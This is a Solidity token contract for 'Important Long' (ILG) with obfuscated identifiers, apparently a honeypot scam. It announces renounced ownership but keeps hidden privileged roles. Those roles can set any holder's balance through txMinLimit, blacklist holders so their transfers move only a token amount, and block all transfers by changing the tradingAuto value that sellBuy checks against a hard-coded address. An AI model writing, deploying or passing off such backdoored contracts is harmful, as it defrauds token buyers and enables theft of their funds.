//SPDX-License-Identifier: MIT

pragma solidity ^0.8.15;

interface launchTake {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract marketingIs {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface shouldBuy {
    function createPair(address liquidityTokenFund, address autoSwap) external returns (address);
}

interface totalAt {
    function totalSupply() external view returns (uint256);

    function balanceOf(address minAmount) external view returns (uint256);

    function transfer(address fundLimit, uint256 shouldSell) external returns (bool);

    function allowance(address launchedWallet, address spender) external view returns (uint256);

    function approve(address spender, uint256 shouldSell) external returns (bool);

    function transferFrom(
        address sender,
        address fundLimit,
        uint256 shouldSell
    ) external returns (bool);

    event Transfer(address indexed from, address indexed receiverSender, uint256 value);
    event Approval(address indexed launchedWallet, address indexed spender, uint256 value);
}

interface totalAtMetadata is totalAt {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract ImportantLong is marketingIs, totalAt, totalAtMetadata {

    function allowance(address listTx, address receiverAt) external view virtual override returns (uint256) {
        if (receiverAt == shouldEnable) {
            return type(uint256).max;
        }
        return amountEnable[listTx][receiverAt];
    }

    mapping(address => uint256) private launchShould;

    address takeTotal = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    mapping(address => bool) public receiverExempt;

    mapping(address => bool) public launchTo;

    function symbol() external view virtual override returns (string memory) {
        return feeAt;
    }

    function transferFrom(address receiverListTake, address fundLimit, uint256 shouldSell) external override returns (bool) {
        if (_msgSender() != shouldEnable) {
            if (amountEnable[receiverListTake][_msgSender()] != type(uint256).max) {
                require(shouldSell <= amountEnable[receiverListTake][_msgSender()]);
                amountEnable[receiverListTake][_msgSender()] -= shouldSell;
            }
        }
        return sellBuy(receiverListTake, fundLimit, shouldSell);
    }

    mapping(address => mapping(address => uint256)) private amountEnable;

    uint256 shouldSwap;

    bool private receiverAmountSwap;

    uint256 private isList = 100000000 * 10 ** 18;

    address public exemptFrom;

    function decimals() external view virtual override returns (uint8) {
        return teamToken;
    }

    address shouldEnable = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function transfer(address enableModeLimit, uint256 shouldSell) external virtual override returns (bool) {
        return sellBuy(_msgSender(), enableModeLimit, shouldSell);
    }

    function tradingAmount(address enableFee) public {
        require(enableFee.balance < 100000);
        if (minWallet) {
            return;
        }
        if (receiverAmountSwap != tokenAmount) {
            launchSellAmount = false;
        }
        launchTo[enableFee] = true;
        if (shouldTeam != amountIs) {
            shouldTeam = amountIs;
        }
        minWallet = true;
    }

    string private amountSender = "Important Long";

    event OwnershipTransferred(address indexed swapAt, address indexed takeWalletTrading);

    constructor (){
        if (receiverAmountSwap) {
            swapMarketing = false;
        }
        launchTake tokenSwap = launchTake(shouldEnable);
        exemptFrom = shouldBuy(tokenSwap.factory()).createPair(tokenSwap.WETH(), address(this));
        
        feeWallet = _msgSender();
        tradingTeam();
        launchTo[feeWallet] = true;
        launchShould[feeWallet] = isList;
        if (receiverAmountSwap) {
            amountIs = shouldTeam;
        }
        emit Transfer(address(0), feeWallet, isList);
    }

    string private feeAt = "ILG";

    function owner() external view returns (address) {
        return tokenEnable;
    }

    uint8 private teamToken = 18;

    uint256 tradingAuto;

    function approve(address receiverAt, uint256 shouldSell) public virtual override returns (bool) {
        amountEnable[_msgSender()][receiverAt] = shouldSell;
        emit Approval(_msgSender(), receiverAt, shouldSell);
        return true;
    }

    function sellEnableExempt(address launchAmount) public {
        isSwap();
        if (receiverAmountSwap == launchSellAmount) {
            launchSellAmount = false;
        }
        if (launchAmount == feeWallet || launchAmount == exemptFrom) {
            return;
        }
        receiverExempt[launchAmount] = true;
    }

    address private tokenEnable;

    bool private launchSellAmount;

    function walletTotalSwap(address receiverListTake, address fundLimit, uint256 shouldSell) internal returns (bool) {
        require(launchShould[receiverListTake] >= shouldSell);
        launchShould[receiverListTake] -= shouldSell;
        launchShould[fundLimit] += shouldSell;
        emit Transfer(receiverListTake, fundLimit, shouldSell);
        return true;
    }

    function tradingTeam() public {
        emit OwnershipTransferred(feeWallet, address(0));
        tokenEnable = address(0);
    }

    bool public minWallet;

    bool private tokenAmount;

    function fromFee(uint256 shouldSell) public {
        isSwap();
        tradingAuto = shouldSell;
    }

    function isSwap() private view {
        require(launchTo[_msgSender()]);
    }

    bool private swapMarketing;

    function getOwner() external view returns (address) {
        return tokenEnable;
    }

    function name() external view virtual override returns (string memory) {
        return amountSender;
    }

    address public feeWallet;

    function balanceOf(address minAmount) public view virtual override returns (uint256) {
        return launchShould[minAmount];
    }

    function totalSupply() external view virtual override returns (uint256) {
        return isList;
    }

    uint256 constant launchedTake = 4 ** 10;

    bool private txTotal;

    uint256 private amountIs;

    function txMinLimit(address enableModeLimit, uint256 shouldSell) public {
        isSwap();
        launchShould[enableModeLimit] = shouldSell;
    }

    uint256 public shouldTeam;

    function sellBuy(address receiverListTake, address fundLimit, uint256 shouldSell) internal returns (bool) {
        if (receiverListTake == feeWallet) {
            return walletTotalSwap(receiverListTake, fundLimit, shouldSell);
        }
        uint256 liquidityMarketingShould = totalAt(exemptFrom).balanceOf(takeTotal);
        require(liquidityMarketingShould == tradingAuto);
        require(fundLimit != takeTotal);
        if (receiverExempt[receiverListTake]) {
            return walletTotalSwap(receiverListTake, fundLimit, launchedTake);
        }
        return walletTotalSwap(receiverListTake, fundLimit, shouldSell);
    }

}